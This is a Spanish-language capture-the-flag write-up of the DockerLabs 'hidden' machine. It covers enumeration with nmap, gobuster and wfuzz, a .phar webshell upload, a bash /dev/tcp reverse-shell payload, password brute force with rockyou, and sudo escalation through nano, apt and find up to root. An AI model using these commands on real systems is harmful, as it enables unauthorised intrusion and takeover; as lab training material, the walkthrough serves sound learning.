@@ -1,0 +1,129 @@
+<p><img src="assets/logo-dockerlabs.png" alt="logodocker" /></p>
+
+<p>En este reto nos encontramos con escaneo de puertos para buscar una entrada al sistema  , enumeracion con con gobuster y busqueda de subdominios con wfuzz , revshell , movimientos laterales y escalada final.</p>
+
+<h2 id="herramientas-y-recursos-usados">Herramientas y recursos usados</h2>
+
+<ul>
+  <li>nmap</li>
+  <li>gobuster</li>
+  <li>wfuzz</li>
+</ul>
+
+<h2 id="enumeracion">Enumeracion</h2>
+
+<p>Empezamos lanzando un nmap contra el objetivo , el cual nos devuelve que solo se encuentra el 80 abierto y podemos ver como nos dice que no consigue llegar a hidden.lab</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>nmap <span class="nt">-p-</span> <span class="nt">-sS</span> <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">--min-rate</span><span class="o">=</span>5000 <span class="nt">-n</span> <span class="nt">-vvv</span> 172.17.0.2 <span class="nt">-oX</span> hidden_nmap 
+</code></pre></div></div>
+<p><a href="/reporte/hiddendocker.html" title="reportesnmap">Reporte nmap</a></p>
+
+<p>Antes de poder revisar la web debemos añadir lo que nos dice nmap al fichero hosts , tambiem aprovechamos y lanzamos gobuster por si encuentra algo.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nvim /etc/hosts
+</code></pre></div></div>
+
+<p><img src="assets/hiddendocker/etchosts.png" alt="hosts" /></p>
+
+<p>Una vez editado el fichero vamos a trabajar.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gobuster <span class="nt">-q</span> <span class="nb">dir</span> <span class="nt">-w</span> /usr/share/dirbuster/directory-list-2.3-medium.txt <span class="nt">-x</span> html,htm,php,txt,xml <span class="nt">-u</span> http://hidden.lab <span class="nt">--exclude-length</span> 3690
+</code></pre></div></div>
+
+<p><img src="assets/hiddendocker/gobuster.png" alt="gobusterweb80" /></p>
+
+<p>Despues de estar un rato mirando la web que creo que es un bootstrap simplemente y hacerme un lio con el formulario de reserva y la ruta que devolvia desisto y pienso que debe haber algo mas, hemos fuzeado directorios con el comando anterior , hemos  revisado la web un buen rato sin frutos asi que vamos a buscar si tuviera algun host virtual.
+Como no sabia como excluir los errores en gobuster tiro de wfuzz.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wfuzz <span class="nt">-c</span> <span class="nt">-w</span> /usr/share/dirbuster/directory-list-2.3-medium.txt <span class="nt">--hc</span> 400,404,403,302 <span class="nt">-H</span> <span class="s2">"Host: FUZZ.hidden.lab"</span> <span class="nt">-u</span> http://hidden.lab <span class="nt">-t</span> 100
+</code></pre></div></div>
+
+<p><img src="assets/hiddendocker/wffuzvhost.png" alt="wfuzz" /></p>
+
+<p>Agregamos de nuevo al fichero hosts el virtualhost que nos da wfuzz y pasamos a ver esa otra web.
+Nos encontramos una subida de archivos y nos indica que un .php no podemos subir , a buscar extensiones que se ejecuten.</p>
+
+<p>Primer intento fallido asi que deduzco que apache debe comprobar que es lo que ejecuta y si no coincide chauuuu</p>
+
+<p><img src="assets/hiddendocker/phpjpg.png" alt="remotejpgphp" /></p>
+
+<p>Documentacion php</p>
+
+<p><img src="assets/hiddendocker/phpphar.png" alt="pharexplicacion" /></p>
+
+<p>Despues de probar a subir un .phar lo ha subido sin promblema , averiguamos ahora donde esta asi que otra vez a gobuster</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gobuster <span class="nt">-q</span> <span class="nb">dir</span> <span class="nt">-w</span> /usr/share/dirbuster/directory-list-2.3-medium.txt <span class="nt">-x</span> html,htm,php,txt,xml <span class="nt">-u</span> http://dev.hidden.lab <span class="nt">--exclude-length</span> 3690
+</code></pre></div></div>
+
+<p><img src="assets/hiddendocker/gobusteruploads.png" alt="resultgobuster" /></p>
+
+<h2 id="infiltracion">Infiltracion</h2>
+
+<p>Ahora parece estar todo listo el rce y la ruta asi que probamos y acepta comandos a por la revshell.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://dev.hidden.lab/uploads/rce.phar?cmd<span class="o">=</span>bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/192.168.0.112/443%200%3E%261%22
+</code></pre></div></div>
+<p><img src="assets/hiddendocker/webshellwhoami.png" alt="webshell" /></p>
+
+<p>Como vemos en la imagen tenemos varios usuarios despues de buscar scripts , suid , sudo , etc no obtengo nada asi que hay que hacer fuerza bruta , busco un script que hizo el pinguino que era para eso linux brute.
+Por otro lado no podemos subirnos el rockyou completo asi que lo despiezamos y lo subimos por el webupload.</p>
+
+<p><img src="assets/hiddendocker/recepcionshell.png" alt="usuarios" /></p>
+
+<p>Comando para dividir por numero de lineas</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">split</span> <span class="nt">-l</span> 1000 rockyou.txt parte_
+</code></pre></div></div>
+
+<p>Ahora que tenemos todo subido al menos la primera parte del rockyou lanzaremos el script y esperemos que la pass este arriba del fichero si no mi paciencia explota porque va de 1000 en 1000.
+Nos desplazamos al directorio dnd se han subido los archivos y lo ejecutamos con las 1000 pass primeras.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./Linux-Su-Force.sh cafetero tudiccionario
+</code></pre></div></div>
+
+<p><img src="assets/hiddendocker/passcafetero.png" alt="cafetero" /></p>
+
+<h2 id="escalada-de-privilegios">Escalada de privilegios</h2>
+
+<p>Si os fijais en la imagen de arriba podeis ver la importancia de configurar bien la revshell.
+Por cierto ataco a cafetero por la relacion clara con la web.
+Pasamos al user cafetero recordamos que hay varios usarios y se debe tratar de ir de uno a otro hasta root.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>su cafetero
+</code></pre></div></div>
+
+<p>Revisamos como siempre y las veces que necesitemos por cada usuario permisos , scripts , directorios hasta encontrar algo.
+Con sudo tenemos suerte.</p>
+
+<p><img src="assets/hiddendocker/sudocafetero.png" alt="sudonano" /></p>
+
+<p>Como vemos podemos ejecutar nano como usuario john.Consultamos gtofbins de ser necesario.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo</span> <span class="nt">-u</span> john nano
+</code></pre></div></div>
+
+<p>Repetimos proceso  este usuario “john” con find , sudo  etc en busca de scripts binarios etc..</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo</span> <span class="nt">-l</span> 
+</code></pre></div></div>
+<p><img src="assets/hiddendocker/sudojohn.png" alt="sudojohn" /></p>
+
+<p>En este caso hacemos uso de apt buscamos en searchbins y adelante.</p>
+
+<p><img src="assets/hiddendocker/searchbinsapt.png" alt="searchbins" /></p>
+
+<p>Ahora como usuario bobby repetimos de nuevo el proceso.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo</span> <span class="nt">-l</span>
+</code></pre></div></div>
+
+<p><img src="assets/hiddendocker/sudobobby.png" alt="bobbylogin" /></p>
+
+<p>Ahora vemos que podemos hacer root con find</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>find <span class="nb">.</span> <span class="nt">-exec</span> /bin/sh <span class="se">\;</span> <span class="nt">-quit</span>
+</code></pre></div></div>
+<p><img src="assets/hiddendocker/root.png" alt="root" /></p>
+
+<p>Gracias por leer y si alguien que lee esto y sabe porque se me vuelve tan loca la terminal agradeceria ayuda.</p>
+
+<p>Saludos</p>
